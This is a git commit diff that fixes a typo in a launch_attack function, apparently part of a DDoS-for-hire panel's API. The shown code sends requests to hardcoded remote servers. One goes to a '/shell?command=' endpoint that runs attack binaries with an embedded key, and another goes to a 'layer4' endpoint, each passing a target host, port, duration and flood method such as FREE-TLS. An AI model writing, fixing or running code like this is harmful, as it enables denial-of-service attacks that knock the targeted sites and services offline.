8448e285b5d39a18a67fc0328ce306e16aa57a31
freshjena-bit <freshjena@gmail.com>
2026-06-04 23:36:37 +0700

    Update index.py

--- api/index.py
+++ api/index.py
@@ -143,7 +143,7 @@ def launch_attack():
     elif method == "HTTPS-JYNX":
         url = f"http://217.144.185.177:5000/shell?command=./HTTPS-JYNX {target} {duration} 50&key=kriskaUSDEGR454T"
         requests.get(url)
-    elif methods == "FREE-TLS":
+    elif method == "FREE-TLS":
         url = f"http://188.166.212.32:2003/layer4?host={target}&port={port}&time={duration}&method=FREE-TLS"
         requests.get(url)
     elif method == "TLS":
